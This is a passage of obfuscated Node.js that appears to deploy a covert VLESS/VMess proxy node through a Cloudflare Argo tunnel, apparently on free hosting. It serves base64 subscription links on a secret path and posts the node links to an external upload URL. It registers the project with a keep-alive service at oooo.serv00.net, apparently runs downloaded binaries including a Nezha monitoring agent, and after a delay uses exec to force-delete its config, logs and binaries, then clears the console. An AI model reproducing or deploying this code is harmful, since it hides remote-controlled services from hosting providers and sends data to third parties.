_0x47aada={_0x118189:0x11a,_0x1d8d97:0xaa,_0x18c29a:0x147,_0x4fd739:0x10d,_0x5dc78c:0x128,_0x5c5f48:0xcd,_0x542e93:0xbe,_0xc0bc70:0xe4,_0x2c184a:0x128,_0x1bca38:0xe9,_0xf92320:0xf1},_0x51ab11={_0x5cfcfc:0x128,_0x4b169e:0xe9};setTimeout(()=>{const _0x26e175=_0x14e4,_0x5f1167={'v':'2','ps':''+_0x168d89,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x26e175(0x11a),'net':'ws','type':_0x26e175(_0x47aada._0x118189),'host':_0x1794e6,'path':'/vmess-argo?ed=2560','tls':_0x26e175(0x11d),'sni':_0x1794e6,'alpn':'','fp':_0x26e175(0x113)},_0x3a387e='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x26e175(_0x47aada._0x1d8d97)+_0x1794e6+_0x26e175(_0x47aada._0x18c29a)+_0x1794e6+_0x26e175(_0x47aada._0x4fd739)+_0x168d89+_0x26e175(0xe6)+Buffer['from'](JSON[_0x26e175(0x115)](_0x5f1167))[_0x26e175(_0x47aada._0x5dc78c)](_0x26e175(0xe9))+_0x26e175(0xc9)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x1794e6+'&fp=firefox&type=ws&host='+_0x1794e6+_0x26e175(_0x47aada._0x5c5f48)+_0x168d89+_0x26e175(_0x47aada._0x542e93);console[_0x26e175(0x149)](Buffer[_0x26e175(_0x47aada._0xc0bc70)](_0x3a387e)[_0x26e175(0x128)]('base64')),fs[_0x26e175(0xb8)](subPath,Buffer[_0x26e175(0xe4)](_0x3a387e)[_0x26e175(_0x47aada._0x2c184a)](_0x26e175(_0x47aada._0x1bca38))),console[_0x26e175(0x149)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x26e175(_0x47aada._0xf92320)]('/'+SUB_PATH,(_0x5d60ae,_0x40623d)=>{const _0x404384=_0x26e175,_0xaeb744=Buffer[_0x404384(0xe4)](_0x3a387e)[_0x404384(_0x51ab11._0x5cfcfc)](_0x404384(_0x51ab11._0x4b169e));_0x40623d[_0x404384(0xab)](_0x404384(0x15f),_0x404384(0x12d)),_0x40623d[_0x404384(0xb5)](_0xaeb744);}),_0x1ad19d(_0x3a387e);},0x7d0);});}}async function uploadNodes(){const _0x10e9f0={_0x16168b:0xc2,_0x134bf0:0xf9,_0x1df3ee:0xd4,_0xc2ccd7:0x111,_0x5d7e01:0xed,_0x1dc6f9:0x12f,_0x5ae496:0x149},_0x579279=_0x3d4905;if(UPLOAD_URL&&PROJECT_URL){const _0x5abdcb=PROJECT_URL+'/'+SUB_PATH,_0x5ebea4={'subscription':[_0x5abdcb]};try{const _0x418bd1=await axios[_0x579279(_0x10e9f0._0x16168b)](UPLOAD_URL+'/api/add-subscriptions',_0x5ebea4,{'headers':{'Content-Type':_0x579279(_0x10e9f0._0x134bf0)}});return _0x418bd1&&_0x418bd1[_0x579279(0x12f)]===0xc8?(console[_0x579279(0x149)](_0x579279(0x15b)),_0x418bd1):null;}catch(_0x4d77b9){if(_0x4d77b9[_0x579279(_0x10e9f0._0x1df3ee)]){if(_0x4d77b9['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x579279(0xa2)](listPath))return;const _0x44b531=fs['readFileSync'](listPath,'utf-8'),_0x4d5af6=_0x44b531[_0x579279(0x123)]('\x0a')[_0x579279(_0x10e9f0._0xc2ccd7)](_0xf0577c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x579279(0x131)](_0xf0577c));if(_0x4d5af6['length']===0x0)return;const _0x2e170d=JSON['stringify']({'nodes':_0x4d5af6});try{const _0x5d68e3=await axios[_0x579279(0xc2)](UPLOAD_URL+_0x579279(_0x10e9f0._0x5d7e01),_0x2e170d,{'headers':{'Content-Type':_0x579279(0xf9)}});return _0x5d68e3&&_0x5d68e3[_0x579279(_0x10e9f0._0x1dc6f9)]===0xc8?(console[_0x579279(_0x10e9f0._0x5ae496)](_0x579279(0x141)),_0x5d68e3):null;}catch(_0x4b1618){return null;}}else return;}}function cleanFiles(){const _0x5c6b02={_0xc8bdf3:0xbc,_0x255bb1:0x158},_0x37664a={_0x1d24c3:0x154,_0x176295:0xcb};setTimeout(()=>{const _0x36b828={_0x5a514e:0x149,_0x20f557:0xdc,_0x738cce:0xcb},_0xe1b37f=_0x14e4,_0x315722=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x315722[_0xe1b37f(_0x5c6b02._0xc8bdf3)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x315722['push'](phpPath);process[_0xe1b37f(0x166)]===_0xe1b37f(0x148)?exec('del\x20/f\x20/q\x20'+_0x315722[_0xe1b37f(0x11f)]('\x20')+_0xe1b37f(0x11b),_0x452aeb=>{const _0x3e179c=_0xe1b37f;console['clear'](),console[_0x3e179c(_0x36b828._0x5a514e)](_0x3e179c(_0x36b828._0x20f557)),console['log'](_0x3e179c(_0x36b828._0x738cce));}):exec(_0xe1b37f(0x152)+_0x315722[_0xe1b37f(0x11f)]('\x20')+_0xe1b37f(_0x5c6b02._0x255bb1),_0x5b8d18=>{const _0x36cb44=_0xe1b37f;console[_0x36cb44(_0x37664a._0x1d24c3)](),console['log'](_0x36cb44(0xdc)),console[_0x36cb44(0x149)](_0x36cb44(_0x37664a._0x176295));});},0x15f90);}function _0x14e4(_0xbc98b0,_0x851b6e){const _0x47d706=_0x47d7();return _0x14e4=function(_0x14e430,_0x28e47e){_0x14e430=_0x14e430-0xa0;let _0xf72e2=_0x47d706[_0x14e430];return _0xf72e2;},_0x14e4(_0xbc98b0,_0x851b6e);}cleanFiles();async function AddVisitTask(){const _0x236eb7={_0x78dced:0xf9,_0x2c2482:0xe3,_0x1283e7:0x15a,_0xe9f7d0:0x13e},_0x2e45b9=_0x3d4905;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2e45b9(0x149)](_0x2e45b9(0xd0));return;}try{const _0x414bb4=await axios[_0x2e45b9(0xc2)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2e45b9(_0x236eb7._0x78dced)}});return console['log'](_0x2e45b9(_0x236eb7._0x2c2482)),_0x414bb4;}catch(_0x20da1c){return console[_0x2e45b9(_0x236eb7._0x1283e7)](_0x2e45b9(0x101)+_0x20da1c[_0x2e45b9(_0x236eb7._0xe9f7d0)]),null;}}async function startserver(){const _0x31326e={_0x5c8aed:0xbd},_0x4f58bf=_0x3d4905;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2a6564){console['error'](_0x4f58bf(_0x31326e._0x5c8aed),_0x2a6564);}}startserver()[_0x3d4905(0xdf)](_0x23f952=>{const _0x33665e={_0x1d734b:0x15a},_0x37d770=_0x3d4905;console[_0x37d770(_0x33665e._0x1d734b)]('Unhandled\x20error\x20in\x20startserver:',_0x23f952);}),app[_0x3d4905(0xf7)](PORT,()=>console[_0x3d4905(0x149)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
